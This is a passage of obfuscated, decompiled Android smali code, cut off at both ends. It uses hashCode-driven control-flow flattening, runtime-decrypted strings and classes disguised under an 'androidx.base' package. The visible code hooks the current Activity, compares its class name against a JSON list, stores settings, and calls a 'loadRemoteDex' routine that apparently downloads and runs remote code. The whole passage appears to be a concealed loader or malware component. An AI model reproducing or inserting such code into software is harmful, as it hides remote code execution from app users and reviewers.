    const-string v2, "\u06e5\u06e5\u06e6\u06e4\u06e8\u06e4\u06df\u06e0\u06dc\u06d7\u06d9\u06dc\u06d8\u06eb\u06d6\u06e8\u06d8\u06d6\u06e5\u06e0\u06e5\u06e4\u06d6\u06e6\u06d8\u06e6\u06e5\u06e1\u06d8\u06d9\u06e1\u06e1\u06e6\u06d8\u06d8\u06e5\u06df\u06e7\u06e4\u06db\u06d6\u06d8\u06e8\u06e0\u06e6\u06d8\u06d8\u06e5\u06e6\u06d8\u06e6\u06e0\u06dc\u06e6\u06e4\u06e6\u06d8\u06e2\u06db\u06d7"

    goto :goto_49

    :cond_1a
    const-string v2, "\u06e2\u06d6\u06e8\u06e0\u06ec\u06df\u06d8\u06e4\u06d7\u06e1\u06dc\u06eb\u06e2\u06df\u06e6\u06d8\u06e8\u06ec\u06e2\u06d6\u06df\u06e5\u06e7\u06e0\u06e4\u06e2\u06d8\u06e0\u06df\u06da\u06e5\u06e2\u06e1\u06d6\u06dc\u06eb\u06d8\u06d8"

    goto :goto_4b

    :sswitch_cc
    if-eqz v7, :cond_1a

    const-string v2, "\u06d8\u06e0\u06d9\u06d7\u06d7\u06ec\u06d8\u06df\u06dc\u06d8\u06d9\u06db\u06e0\u06eb\u06e6\u06d6\u06e2\u06eb\u06e2\u06d8\u06d8\u06d8\u06e6\u06eb\u06d6\u06e5\u06e5\u06e5\u06d8\u06e8\u06e2\u06d9\u06e6\u06e2\u06ec\u06d9\u06e5\u06e4\u06e1\u06e2\u06dc\u06da\u06d6\u06d9"

    goto :goto_4b

    :sswitch_cd
    const-string v2, "\u06e0\u06e5\u06e2\u06eb\u06df\u06e8\u06eb\u06e4\u06e5\u06d8\u06eb\u06db\u06db\u06d9\u06e5\u06d7\u06e4\u06dc\u06db\u06e6\u06df\u06d8\u06d8\u06eb\u06e8\u06e1\u06d8\u06e4\u06df\u06dc\u06d8\u06df\u06da\u06da\u06d8\u06e1\u06d8\u06e5\u06e2\u06e5\u06d8\u06d6\u06e0\u06e8\u06d8"

    goto :goto_4b

    :sswitch_ce
    invoke-virtual {v7}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v8

    const/4 v2, 0x0

    :goto_4c
    const v9, -0xc35586d

    const-string v4, "\u06db\u06e2\u06e0\u06d6\u06d7\u06d6\u06e7\u06e8\u06e8\u06d8\u06eb\u06e5\u06d8\u06e0\u06d6\u06df\u06e1\u06e2\u06d8\u06d8\u06e4\u06e6\u06e5\u06dc\u06e5\u06e1\u06e2\u06e1\u06e7\u06e8\u06e1\u06e6\u06e2\u06e5\u06d8\u06df\u06d8\u06d8\u06eb\u06e0\u06e8\u06dc\u06ec\u06df"

    :goto_4d
    invoke-virtual {v4}, Ljava/lang/String;->hashCode()I

    move-result v10

    xor-int/2addr v10, v9

    sparse-switch v10, :sswitch_data_38

    goto :goto_4d

    :sswitch_cf
    const v10, -0x509248e2

    const-string v4, "\u06e7\u06ec\u06dc\u06d9\u06db\u06d7\u06e6\u06d8\u06d7\u06e2\u06da\u06e1\u06e1\u06df\u06d8\u06d8\u06e5\u06e1\u06d7\u06e7\u06da\u06e1\u06e0\u06e4\u06e4\u06da\u06df\u06e6\u06d8\u06d7\u06e7\u06e7\u06ec\u06db\u06e6\u06d8\u06e1\u06db\u06dc\u06d8\u06e2\u06db\u06eb\u06e7\u06df\u06e6\u06d9\u06e6\u06e2\u06e8\u06e6\u06ec\u06da\u06e0\u06d8\u06e2\u06e1\u06d7"

    :goto_4e
    invoke-virtual {v4}, Ljava/lang/String;->hashCode()I

    move-result v11

    xor-int/2addr v11, v10

    sparse-switch v11, :sswitch_data_39

    goto :goto_4e

    :sswitch_d0
    invoke-virtual {v5}, Lorg/json/JSONArray;->length()I

    move-result v4

    if-ge v2, v4, :cond_1b

    const-string v4, "\u06eb\u06d8\u06d6\u06d8\u06dc\u06e5\u06e1\u06d8\u06e6\u06e5\u06e8\u06da\u06e1\u06d6\u06eb\u06e5\u06d6\u06eb\u06df\u06eb\u06d6\u06d6\u06ec\u06e6\u06e2\u06e6\u06d8\u06d7\u06eb\u06e1\u06d8\u06df\u06db\u06e5\u06e2\u06d7\u06e2\u06e8\u06d6\u06ec\u06e1\u06eb\u06e6\u06e2\u06ec\u06ec\u06df\u06e2\u06e5\u06d8\u06dc\u06e0\u06d7"

    goto :goto_4e

    :sswitch_d1
    const-string v4, "\u06e1\u06e7\u06dc\u06d9\u06df\u06e2\u06e4\u06d8\u06dc\u06d8\u06e2\u06e8\u06eb\u06e5\u06da\u06e1\u06d8\u06df\u06eb\u06e6\u06d6\u06e2\u06d6\u06d8\u06da\u06ec\u06d8\u06d8\u06e6\u06e0\u06e8\u06d8\u06e1\u06e5\u06dc\u06d8\u06e2\u06df\u06db\u06e6\u06e0\u06d8"

    goto :goto_4d

    :cond_1b
    const-string v4, "\u06e2\u06e2\u06df\u06e1\u06da\u06eb\u06e6\u06d8\u06e6\u06d8\u06e6\u06e5\u06e5\u06d6\u06df\u06e4\u06d8\u06eb\u06d8\u06d8\u06e8\u06d8\u06e7\u06d8\u06d7\u06e1\u06e0\u06d7\u06df\u06eb\u06dc\u06df\u06d6\u06e6\u06e1\u06e8\u06eb\u06dc\u06d7"

    goto :goto_4e

    :sswitch_d2
    const-string v4, "\u06e5\u06e8\u06e6\u06e5\u06ec\u06e6\u06d8\u06e0\u06e7\u06e1\u06e8\u06e5\u06e8\u06e7\u06e4\u06e5\u06eb\u06d7\u06d6\u06d9\u06d6\u06d8\u06db\u06e5\u06e8\u06d8\u06d6\u06ec\u06eb\u06e1\u06e4\u06e6"

    goto :goto_4e

    :sswitch_d3
    const-string v4, "\u06e8\u06e0\u06e8\u06d8\u06d8\u06e7\u06e2\u06e6\u06e5\u06e7\u06d8\u06e0\u06e6\u06d6\u06d8\u06d7\u06dc\u06d6\u06d8\u06e4\u06e2\u06dc\u06d8\u06e2\u06ec\u06e7\u06e0\u06e0\u06da\u06e7\u06e6\u06dc\u06e5\u06da\u06e4"

    goto :goto_4d

    :sswitch_d4
    const-string v4, "\u06ec\u06df\u06e2\u06d8\u06d8\u06d6\u06d8\u06e0\u06dc\u06eb\u06d9\u06e5\u06d6\u06e5\u06e4\u06e0\u06e5\u06d8\u06e2\u06db\u06df\u06e2\u06e4\u06e0\u06eb\u06db\u06e7\u06d8\u06d8\u06eb\u06dc\u06e8\u06e5\u06e4\u06d9\u06e7\u06dc\u06e8\u06d9\u06d8\u06e8\u06eb\u06e0\u06d6\u06d8\u06d6\u06e6\u06d9\u06d9\u06e2\u06d9\u06eb\u06d9\u06d8\u06e5\u06dc\u06e8\u06d8"

    goto :goto_4d

    :sswitch_d5
    const v9, -0x39b94e61

    const-string v4, "\u06d7\u06e4\u06e2\u06e0\u06d7\u06e6\u06d8\u06db\u06e7\u06e1\u06d8\u06da\u06e0\u06e4\u06e4\u06dc\u06e4\u06eb\u06eb\u06e4\u06e7\u06e2\u06e7\u06e2\u06e0\u06e2\u06d6\u06d6\u06e1\u06e0\u06d9\u06e6\u06d7\u06d8\u06d7\u06d6\u06d8\u06e5\u06db\u06d8\u06d8\u06e4\u06dc\u06e6\u06d8"

    :goto_4f
    invoke-virtual {v4}, Ljava/lang/String;->hashCode()I

    move-result v10

    xor-int/2addr v10, v9

    sparse-switch v10, :sswitch_data_3a

    goto :goto_4f

    :sswitch_d6
    add-int/lit8 v2, v2, 0x1

    goto :goto_4c

    :sswitch_d7
    const-string v4, "\u06e2\u06d6\u06db\u06ec\u06e1\u06d8\u06d8\u06df\u06d6\u06e7\u06d8\u06e4\u06e2\u06e6\u06e8\u06e6\u06e2\u06e7\u06e5\u06da\u06e7\u06e7\u06e2\u06e5\u06d9\u06d6\u06dc\u06d8\u06d8\u06d9\u06e8\u06ec\u06d9\u06d6\u06ec\u06d9\u06db\u06eb\u06ec\u06d7\u06ec\u06e8\u06df\u06e6"

    goto :goto_4f

    :sswitch_d8
    const v10, 0x6e2ce891

    const-string v4, "\u06e6\u06d8\u06da\u06e4\u06e5\u06e2\u06e4\u06e2\u06d6\u06e6\u06e0\u06e7\u06e1\u06d6\u06e5\u06ec\u06da\u06ec\u06eb\u06ec\u06db\u06db\u06e5\u06e1\u06df\u06e8\u06ec\u06ec\u06e0"

    :goto_50
    invoke-virtual {v4}, Ljava/lang/String;->hashCode()I

    move-result v11

    xor-int/2addr v11, v10

    sparse-switch v11, :sswitch_data_3b

    goto :goto_50

    :sswitch_d9
    const-string v4, "\u06d6\u06e6\u06d7\u06e5\u06e0\u06e5\u06ec\u06d7\u06db\u06e6\u06d8\u06d6\u06e1\u06e7\u06e4\u06ec\u06dc\u06d8\u06db\u06dc\u06dc\u06d9\u06e8\u06d6\u06d8\u06e1\u06db\u06ec\u06e0\u06e6\u06d9\u06e1\u06e1\u06e1\u06d8\u06e1\u06ec\u06e2\u06e4\u06d8\u06ec\u06e5\u06da\u06e6"

    goto :goto_4f

    :cond_1c
    const-string v4, "\u06db\u06eb\u06e1\u06db\u06dc\u06e1\u06d8\u06dc\u06e1\u06e6\u06d8\u06eb\u06df\u06dc\u06d8\u06d7\u06df\u06d6\u06dc\u06e5\u06d6\u06d8\u06e6\u06e0\u06d7\u06df\u06e4\u06df\u06e5\u06e7\u06e1\u06df\u06d6\u06ec\u06e8\u06df\u06e6\u06d8\u06db\u06e4\u06e1\u06d8\u06e5\u06eb\u06e7\u06e0\u06e7\u06e1\u06d8\u06d8\u06d6\u06dc\u06db\u06da\u06e8\u06d8"

    goto :goto_50

    :sswitch_da
    invoke-virtual {v5, v2}, Lorg/json/JSONArray;->optString(I)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v8, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_1c

    const-string v4, "\u06d9\u06df\u06dc\u06d8\u06d6\u06d9\u06da\u06e1\u06eb\u06e5\u06ec\u06eb\u06e8\u06ec\u06e2\u06d9\u06e8\u06e7\u06e5\u06d8\u06d9\u06e8\u06e6\u06d8\u06ec\u06ec\u06d7\u06ec\u06ec\u06db\u06db\u06e2\u06e8\u06d8\u06dc\u06e0\u06e0\u06db\u06df\u06e5\u06d8\u06dc\u06d8\u06d8\u06d8\u06e7\u06d9\u06d8\u06d8\u06d8\u06ec\u06dc\u06d6\u06e4\u06e0\u06e1\u06ec\u06e6\u06d7\u06e0\u06d6"

    goto :goto_50

    :sswitch_db
    const-string v4, "\u06d9\u06d7\u06e1\u06d8\u06dc\u06dc\u06d8\u06e6\u06d6\u06ec\u06e2\u06e7\u06e2\u06e4\u06e4\u06d9\u06d9\u06d9\u06dc\u06d9\u06db\u06e6\u06d8\u06d6\u06e1\u06d6\u06d8\u06d6\u06da\u06e1\u06e5\u06d6\u06e4\u06db\u06dc\u06dc\u06d8\u06da\u06e4\u06e8\u06d8\u06db\u06db\u06e8\u06d8\u06e2\u06db\u06e4\u06e7\u06e2\u06dc\u06ec\u06dc"

    goto :goto_50

    :sswitch_dc
    const-string v4, "\u06eb\u06d9\u06e8\u06e0\u06d7\u06db\u06ec\u06da\u06dc\u06d8\u06e2\u06e0\u06e6\u06e0\u06ec\u06da\u06d7\u06dc\u06e6\u06da\u06ec\u06e1\u06d6\u06e6\u06e7\u06e7\u06e1\u06dc\u06d6\u06e8\u06e5\u06eb\u06eb\u06e1\u06d8\u06e0\u06d9\u06e7\u06da\u06e6\u06e5\u06eb\u06d7\u06e4"

    goto :goto_4f

    :sswitch_dd
    new-instance v2, Landroidx/base/연결;

    const/4 v4, 0x0

    move-object/from16 v0, p3

    invoke-direct {v2, v0, v7, v4}, Landroidx/base/연결;-><init>(Landroid/content/Context;Landroid/app/Activity;I)V

    invoke-virtual {v7, v2}, Landroid/app/Activity;->runOnUiThread(Ljava/lang/Runnable;)V

    :sswitch_de
    invoke-static {}, LKvrUY/RiiGL/Utils;->getCurrentActivity()Landroid/app/Activity;

    move-result-object v4

    const v5, 0x233bc4a

    const-string v2, "\u06dc\u06e5\u06e2\u06d7\u06e5\u06e8\u06d8\u06eb\u06db\u06e1\u06d8\u06e8\u06d8\u06e7\u06eb\u06e5\u06e6\u06d8\u06ec\u06e6\u06e7\u06dc\u06e1\u06d8\u06d8\u06da\u06da\u06ec\u06e7\u06e2\u06d8\u06e0\u06e5\u06e7\u06d7\u06e4\u06dc\u06d8\u06d7\u06ec\u06e4\u06e8\u06e1\u06db\u06db\u06e8\u06d6\u06d8"

    :goto_51
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v7

    xor-int/2addr v7, v5

    sparse-switch v7, :sswitch_data_3c

    goto :goto_51

    :goto_52
    :sswitch_df
    new-instance v2, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v4

    invoke-direct {v2, v4}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v4, Landroidx/base/처리;

    const/4 v5, 0x1

    invoke-direct {v4, v5}, Landroidx/base/처리;-><init>(I)V

    invoke-virtual {v2, v4}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    invoke-static/range {p3 .. p3}, LKvrUY/RiiGL/Utils;->loadRemoteDex(Landroid/content/Context;)V

    invoke-interface/range {p5 .. p5}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v2

    sget-object v4, Landroidx/base/저장;->e:Ljava/lang/String;

    const/4 v5, 0x0

    aget v5, p0, v5

    aget-object v5, p6, v5

    invoke-interface {v2, v4, v5}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    move-result-object v2

    sget-object v4, Landroidx/base/저장;->f:Ljava/lang/String;

    const/4 v5, 0x0

    aget v5, p2, v5

    invoke-interface {v2, v4, v5}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    move-result-object v2

    invoke-interface {v2}, Landroid/content/SharedPreferences$Editor;->apply()V

    const/4 v2, 0x0

    sput-boolean v2, Landroidx/base/저장;->a:Z

    const v4, 0x64eaae02

    const-string v2, "\u06dc\u06e7\u06d9\u06db\u06dc\u06e6\u06e8\u06e6\u06d9\u06da\u06e6\u06e7\u06d8\u06dc\u06df\u06d8\u06eb\u06eb\u06e8\u06e1\u06eb\u06e4\u06e5\u06da\u06e8\u06d8\u06e2\u06da\u06d9\u06e5\u06e1\u06e6\u06d8\u06d6\u06d6\u06e1\u06e2\u06d8"

    :goto_53
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v5

    xor-int/2addr v5, v4

    sparse-switch v5, :sswitch_data_3d

    goto :goto_53

    :sswitch_e0
    const v5, 0x526b16c

    const-string v2, "\u06dc\u06ec\u06db\u06e5\u06e0\u06ec\u06e4\u06e4\u06da\u06dc\u06e5\u06d8\u06e5\u06db\u06d9\u06d7\u06e8\u06d6\u06df\u06e2\u06e8\u06e1\u06e4\u06e6\u06d8\u06d7\u06d9\u06d8\u06d8\u06e8\u06e6\u06d8\u06d8"

    :goto_54
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v7

    xor-int/2addr v7, v5

    sparse-switch v7, :sswitch_data_3e

    goto :goto_54

    :sswitch_e1
    const-string v2, "SS83HNDhmz1DKg==\n"

    const-string v7, "LEFWfryE01I=\n"

    invoke-static {v2, v7}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const/4 v7, 0x1

    invoke-virtual {v6, v2, v7}, Lorg/json/JSONObject;->optBoolean(Ljava/lang/String;Z)Z

    move-result v2

    if-eqz v2, :cond_1e

    const-string v2, "\u06e2\u06eb\u06ec\u06d8\u06da\u06eb\u06df\u06e4\u06ec\u06e8\u06d8\u06e0\u06d9\u06d6\u06eb\u06e7\u06e1\u06d9\u06dc\u06d6\u06e0\u06d8\u06e1\u06db\u06d8\u06e7\u06d8\u06e0\u06df\u06e8"

    goto :goto_54

    :sswitch_e2
    const-string v2, "\u06e8\u06df\u06e7\u06e5\u06eb\u06e2\u06e8\u06dc\u06d6\u06d8\u06e8\u06dc\u06e2\u06da\u06eb\u06e1\u06d8\u06d8\u06ec\u06e5\u06d8\u06d8\u06d6\u06dc\u06d8\u06e2\u06e0\u06e7\u06df\u06d6\u06d6\u06da\u06ec\u06e6\u06d8\u06e0\u06e8\u06e8\u06e4\u06e1\u06d9\u06e6\u06eb\u06d6\u06da\u06d8\u06e0\u06d8\u06da\u06d6\u06d8\u06d6\u06d7\u06d9"

    goto :goto_51

    :sswitch_e3
    const v7, 0x4a7e8add    # 4170423.2f

    const-string v2, "\u06d6\u06dc\u06e0\u06d8\u06d9\u06dc\u06d8\u06e6\u06dc\u06e7\u06d8\u06dc\u06da\u06d9\u06dc\u06e0\u06d6\u06d8\u06e2\u06d8\u06df\u06d9\u06e1\u06e0\u06e6\u06e4\u06eb\u06e5\u06df\u06e2\u06e1\u06da\u06e5\u06d8\u06e8\u06d8\u06dc\u06df\u06e6\u06d8\u06d6\u06df\u06dc\u06d8\u06e5\u06e0\u06e5\u06d8\u06e5\u06d7\u06e5\u06dc\u06e2\u06da"

    :goto_55
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v8

    xor-int/2addr v8, v7

    sparse-switch v8, :sswitch_data_3f

    goto :goto_55

    :sswitch_e4
    invoke-static {v4}, LKvrUY/RiiGL/Utils;->g(Landroid/app/Activity;)Z

    move-result v2

    if-eqz v2, :cond_1d

    const-string v2, "\u06e2\u06d6\u06df\u06e6\u06e5\u06e6\u06d7\u06e8\u06e1\u06d8\u06d9\u06d9\u06e4\u06d6\u06e4\u06da\u06db\u06d7\u06e1\u06d8\u06e6\u06e2\u06e2\u06eb\u06e8\u06e5\u06d8\u06e6\u06e2\u06e1\u06d8\u06d8\u06d6\u06e0\u06e7\u06d7\u06dc\u06db\u06e1\u06d8\u06e7\u06da\u06e6\u06d8\u06df\u06d7\u06d8\u06d8\u06e0\u06e1\u06dc\u06d8\u06da\u06d7"

    goto :goto_55

    :cond_1d
    const-string v2, "\u06d8\u06d6\u06d6\u06d9\u06d7\u06dc\u06d8\u06df\u06da\u06d8\u06e5\u06e2\u06e1\u06e8\u06d9\u06ec\u06e7\u06df\u06da\u06df\u06df\u06db\u06e4\u06e8\u06d8\u06e4\u06ec\u06d9\u06db\u06e1\u06d8\u06e2\u06df\u06e8\u06e7\u06e2\u06e7"

    goto :goto_55

    :sswitch_e5
    const-string v2, "\u06e1\u06e1\u06e1\u06ec\u06e6\u06df\u06e6\u06e0\u06d6\u06e0\u06e7\u06e0\u06e2\u06d6\u06da\u06e7\u06e5\u06e5\u06db\u06d7\u06e8\u06e7\u06ec\u06d7\u06e8\u06eb\u06e0\u06e6\u06e5"

    goto :goto_55

    :sswitch_e6
    const-string v2, "\u06e0\u06eb\u06dc\u06d6\u06e7\u06d8\u06e1\u06e0\u06e5\u06d8\u06e8\u06eb\u06e5\u06d8\u06d8\u06e6\u06df\u06e8\u06e6\u06da\u06e4\u06db\u06d8\u06e8\u06da\u06e1\u06dc\u06e0\u06d7\u06e4\u06d7\u06d8\u06da\u06db\u06e4\u06dc\u06e6\u06d8"

    goto/16 :goto_51

    :sswitch_e7
    const-string v2, "\u06e4\u06da\u06d8\u06db\u06e5\u06e5\u06d8\u06db\u06e4\u06e4\u06df\u06df\u06e1\u06d8\u06e2\u06e0\u06e1\u06d8\u06e4\u06e4\u06d6\u06e8\u06e2\u06e8\u06da\u06dc\u06d9\u06e5\u06d7\u06da\u06ec\u06d9\u06dc\u06eb\u06d8\u06d8\u06d8\u06e7\u06d6\u06e8\u06d8\u06d6\u06d6\u06e2\u06e6\u06e1"

    goto/16 :goto_51

    :sswitch_e8
    new-instance v2, Landroidx/base/연결;

    const/4 v5, 0x1

    move-object/from16 v0, p3

    invoke-direct {v2, v4, v0, v5}, Landroidx/base/연결;-><init>(Landroid/app/Activity;Landroid/content/Context;I)V

    invoke-virtual {v4, v2}, Landroid/app/Activity;->runOnUiThread(Ljava/lang/Runnable;)V

    goto/16 :goto_52

    :sswitch_e9
    const-string v2, "\u06da\u06d8\u06d8\u06d8\u06e2\u06d8\u06e0\u06d8\u06da\u06e7\u06e6\u06e2\u06eb\u06e5\u06db\u06e5\u06eb\u06d6\u06e6\u06e4\u06d6\u06e0\u06db\u06e1\u06ec\u06e1\u06da\u06d6\u06d7\u06da\u06dc\u06d8\u06db\u06df\u06dc\u06d8\u06e0\u06e6\u06e0\u06e6\u06e0\u06e6\u06d8\u06e0\u06d6\u06e1\u06df\u06ec\u06da\u06e5\u06d9\u06e1\u06d8\u06e8\u06da\u06d6\u06d8\u06e8\u06db\u06e5"

    goto :goto_53

    :cond_1e
    const-string v2, "\u06eb\u06ec\u06ec\u06e0\u06e6\u06e5\u06d8\u06da\u06e1\u06e1\u06e5\u06e6\u06d8\u06e7\u06d7\u06e5\u06d8\u06d6\u06da\u06e8\u06db\u06df\u06e8\u06d8\u06d7\u06e8\u06db\u06e8\u06ec\u06ec\u06d9\u06eb\u06e6"

    goto :goto_54

    :sswitch_ea
    const-string v2, "\u06da\u06da\u06e5\u06d8\u06e7\u06e7\u06e6\u06e1\u06ec\u06e6\u06ec\u06e4\u06e7\u06d7\u06e5\u06e8\u06d8\u06e4\u06e5\u06e4\u06e0\u06e1\u06e8\u06d8\u06df\u06e1\u06e8\u06d8\u06d6\u06d6\u06dc\u06d8\u06e7\u06da\u06e1\u06e6\u06dc\u06e7\u06d8\u06d9\u06d8\u06d8\u06e5\u06d9\u06e5\u06da\u06e7\u06eb\u06d7\u06dc\u06d6\u06d8\u06e5\u06e6\u06e0"

    goto :goto_54

    :sswitch_eb
    const-string v2, "\u06e7\u06e5\u06e7\u06db\u06e0\u06d9\u06d9\u06e4\u06e6\u06db\u06ec\u06db\u06d8\u06e8\u06e7\u06d8\u06e4\u06db\u06dc\u06d8\u06e2\u06d6\u06e4\u06db\u06e7\u06d9\u06e6\u06da\u06e8\u06df\u06e6\u06d9"

    goto :goto_53

    :sswitch_ec
    const-string v2, "\u06eb\u06d7\u06e1\u06eb\u06eb\u06d6\u06d8\u06eb\u06db\u06e6\u06d8\u06e1\u06da\u06d7\u06e6\u06df\u06dc\u06e0\u06e7\u06e0\u06e1\u06e5\u06e2\u06eb\u06e2\u06d7\u06e2\u06e7\u06e5\u06d8\u06d6\u06e7\u06dc\u06d8\u06e6\u06db\u06ec\u06da\u06ec\u06e8\u06e6\u06db\u06da\u06dc\u06df\u06e1"

    goto :goto_53

    :sswitch_ed
    const-string v2, "Qp/M1hFgb3xFjsI=\n"

    const-string v4, "LPq7t3IUBgo=\n"

    invoke-static {v2, v4}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v6, v2}, Lorg/json/JSONObject;->optJSONArray(Ljava/lang/String;)Lorg/json/JSONArray;

    move-result-object v4

    const v5, -0x6447fc19

    const-string v2, "\u06e8\u06da\u06e2\u06e2\u06d7\u06dc\u06d8\u06d9\u06e7\u06e8\u06e6\u06d8\u06e8\u06df\u06d6\u06d9\u06d9\u06e0\u06e4\u06e7\u06d8\u06eb\u06ec\u06e2\u06e7\u06e8\u06da\u06eb\u06d9\u06e6\u06e7\u06d8\u06d6\u06e7\u06e0\u06da\u06e8\u06e5\u06d8\u06df\u06da\u06e0\u06d6\u06e8\u06e8\u06d8\u06e0\u06e7\u06e1\u06e6\u06e1\u06df"

    :goto_56
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I
    :try_end_2a
    .catch Ljava/lang/Exception; {:try_start_2a .. :try_end_2a} :catch_7

    move-result v6

    xor-int/2addr v6, v5

    sparse-switch v6, :sswitch_data_40

    goto :goto_56

    :sswitch_ee
    const-string v2, "\u06e8\u06d9\u06da\u06da\u06e6\u06e1\u06d9\u06e7\u06e5\u06eb\u06e8\u06d6\u06da\u06dc\u06e0\u06d8\u06e8\u06e2\u06e4\u06e6\u06d8\u06df\u06d6\u06e8\u06d8\u06df\u06eb\u06e7\u06dc\u06d9\u06e7\u06eb\u06e6\u06dc\u06df\u06e5\u06e7\u06d8\u06e1\u06df\u06d8\u06dc\u06db\u06d8\u06d8\u06eb\u06e2\u06e7\u06db\u06e1\u06e0\u06e6\u06d7"

    goto :goto_56

    :sswitch_ef
    :try_start_2b
    const-string v2, "\u06ec\u06d8\u06d6\u06e6\u06e0\u06e2\u06e7\u06e0\u06ec\u06da\u06e6\u06d9\u06d8\u06df\u06d9\u06d6\u06e4\u06e8\u06d8\u06ec\u06d8\u06e2\u06e0\u06e4\u06db\u06db\u06da\u06e1\u06d8\u06e6\u06d6\u06e1\u06df\u06df\u06e0\u06e5\u06e6\u06d6\u06d8\u06ec\u06e6\u06dc\u06d8\u06d6\u06e1\u06e1"

    goto :goto_56

    :sswitch_f0
    const v6, 0x26e89ced

    const-string v2, "\u06ec\u06e1\u06d9\u06d9\u06e4\u06ec\u06dc\u06da\u06dc\u06d9\u06e8\u06e1\u06e6\u06d6\u06d6\u06df\u06e5\u06df\u06d8\u06da\u06e8\u06d8\u06dc\u06d9\u06ec\u06e1\u06e8\u06df\u06df\u06e6\u06dc\u06d7\u06e8\u06db\u06e7\u06df\u06d6\u06d8\u06e6\u06e7\u06e0\u06e0\u06eb\u06e2\u06eb\u06e2\u06e1\u06e2\u06e0\u06e8\u06e4\u06ec\u06e8\u06d8\u06eb\u06e6\u06d8"

    :goto_57
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v7

    xor-int/2addr v7, v6

    sparse-switch v7, :sswitch_data_41

    goto :goto_57

    :sswitch_f1
    const-string v2, "\u06e7\u06e6\u06d8\u06e6\u06e7\u06ec\u06dc\u06eb\u06e1\u06d8\u06da\u06e0\u06d7\u06df\u06db\u06d8\u06d9\u06db\u06d9\u06e8\u06e1\u06d7\u06db\u06ec\u06d6\u06d8\u06e2\u06db\u06e1\u06d8\u06d9\u06e0\u06d6\u06e8\u06e0\u06e5\u06d8\u06d6\u06e6\u06eb\u06d9\u06df\u06dc\u06d8\u06ec\u06ec\u06e6\u06d8\u06e5\u06dc\u06e6\u06d8\u06e8\u06e8\u06e0\u06da\u06da\u06e6\u06da\u06d6\u06d8"

    goto :goto_57

    :cond_1f
    const-string v2, "\u06e2\u06e1\u06e1\u06d8\u06e4\u06d8\u06dc\u06d8\u06eb\u06eb\u06ec\u06e2\u06d7\u06da\u06d8\u06d7\u06e8\u06d8\u06d8\u06eb\u06e0\u06e4\u06e7\u06df\u06e5\u06e7\u06d6\u06eb\u06e1\u06da\u06d7\u06e6\u06ec\u06e2\u06e1\u06df\u06da\u06d8\u06d8"

    goto :goto_57

    :sswitch_f2
    if-eqz v4, :cond_1f

    const-string v2, "\u06e1\u06eb\u06e8\u06df\u06e5\u06df\u06e4\u06da\u06da\u06e6\u06eb\u06e0\u06ec\u06e5\u06dc\u06e4\u06e7\u06e5\u06e8\u06d7\u06e8\u06d8\u06e8\u06e2\u06e8\u06d7\u06dc\u06d8\u06d9\u06eb\u06d6"

    goto :goto_57

    :sswitch_f3
    const-string v2, "\u06eb\u06eb\u06d6\u06e1\u06d9\u06e0\u06e5\u06e5\u06d8\u06dc\u06db\u06dc\u06d8\u06ec\u06d7\u06e6\u06d8\u06eb\u06d6\u06da\u06ec\u06e4\u06df\u06e0\u06db\u06d6\u06d8\u06e0\u06ec\u06d6\u06d8\u06d6\u06e1\u06e7\u06d8"

    goto :goto_56

    :sswitch_f4
    const v5, 0x2b3cc14a

    const-string v2, "\u06e8\u06e6\u06e0\u06ec\u06dc\u06e1\u06d8\u06db\u06d7\u06e2\u06ec\u06e6\u06e5\u06d8\u06eb\u06d9\u06da\u06e4\u06d6\u06d6\u06e4\u06dc\u06e5\u06d8\u06d6\u06e4\u06dc\u06d8\u06d9\u06db\u06e2\u06d8\u06ec\u06e2\u06e6\u06db\u06dc\u06dc\u06d8\u06e6\u06df\u06d8\u06eb\u06d7\u06d7\u06d6\u06e2\u06e2\u06d7\u06ec\u06e8\u06d8\u06e6\u06e4\u06d9\u06da\u06e4\u06dc\u06d8"

    :goto_58
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v6

    xor-int/2addr v6, v5

    sparse-switch v6, :sswitch_data_42

    goto :goto_58

    :sswitch_f5
    const v6, -0x3935d66e

    const-string v2, "\u06d7\u06e2\u06e7\u06e6\u06e5\u06d7\u06dc\u06e7\u06d8\u06e8\u06dc\u06da\u06d8\u06e8\u06df\u06d6\u06e0\u06e6\u06d7\u06e7\u06e7\u06d9\u06ec\u06d9\u06db\u06e8\u06dc\u06ec\u06d6\u06e5\u06d8\u06e2\u06da\u06d9\u06e0\u06d7\u06df\u06eb\u06d7\u06e5\u06d8\u06d9\u06e8"

    :goto_59
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v7

    xor-int/2addr v7, v6

    sparse-switch v7, :sswitch_data_43

    goto :goto_59

    :sswitch_f6
    invoke-virtual {v4}, Lorg/json/JSONArray;->length()I

    move-result v2

    if-lez v2, :cond_20

    const-string v2, "\u06e4\u06e8\u06d6\u06da\u06e1\u06e5\u06d8\u06e2\u06d9\u06d7\u06ec\u06d7\u06e1\u06d9\u06d8\u06e8\u06eb\u06e6\u06d8\u06d6\u06d6\u06dc\u06d8\u06e2\u06df\u06e2\u06e2\u06ec\u06dc\u06e6\u06e2\u06d6\u06d8\u06e4\u06d9\u06ec\u06dc\u06eb\u06e8\u06da\u06e8\u06e1\u06eb\u06e2\u06d6"

